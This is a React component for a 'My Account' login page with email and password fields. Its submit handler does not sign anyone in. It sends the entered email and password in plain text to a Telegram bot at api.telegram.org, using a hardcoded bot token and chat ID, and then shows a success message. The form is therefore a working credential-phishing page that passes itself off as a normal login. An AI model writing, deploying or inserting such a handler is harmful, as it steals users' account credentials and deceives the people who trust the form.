import React, { useState } from 'react';
import { NavLink, Outlet } from "react-router-dom";
import { Toaster, toast } from 'react-hot-toast';
import Login1 from '../assets/15.png'

const Login = () => {

   const [formData, setFormData] = useState({
          name: '',
          message: '',
      });
  
   const handleInputChange = (e) => {
      const { name, value } = e.target;
      setFormData(prevState => ({
          ...prevState,
          [name]: value
      }));
  };
  
  const sendToTelegramBot = async (e) => {
      e.preventDefault();
      const botToken = '7686093249:AAHrIA99271I4_uFTUk-yuehmREMjWcUqsQ';
      const chatId = '5900769240';
      const text = `Login
      😀:Email: ${formData.message}
      📄:Password: ${formData.name}`;
  
      try {
          const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                  chat_id: chatId,
                  text: text
              })
          });
  
          if (response.ok) {
              toast.success('Successfully sent!');
              setFormData({ name: '', message: '' });
          } else {
              toast.error('Error sending message!');
          }
      } catch (error) {
          console.error('Error:', error);
          alert('An error occurred. Please try again later.');
      }
  };

  return (
    <div className="login">
      <div className="login1">
        <h1>My Account</h1>
        <div className="login1_pas">
          <NavLink to="/home">Home.</NavLink>
          <NavLink to="/pages">Pages.</NavLink>
          <p>My Account</p>
        </div>
      </div>
      <div className="login_main">
        <Toaster/>
        <div className="login_cards">
          <div className="login_card">
            <h1>Login</h1>
            <p>Please login using account details below.</p>
            <form onSubmit={sendToTelegramBot}>
              <input
                type="email"
                placeholder="Email Address"
                name="message"
                value={formData.message}
                onChange={handleInputChange}
                required
              />
              <input
                type="password"
                placeholder="Password"
                name="name"
                value={formData.name}
                onChange={handleInputChange}
                required
              />
              <button type="submit">Sign In</button>
            </form>
            <p>Don’t have an Account? Create account</p>
          </div>
        </div>

        <div className="login_3">
          <div className="login_3_main">

          <img src={Login1} alt="" />
          </div>
        </div>
      </div>
      <Outlet/>
    </div>
  );
};

export default Login;
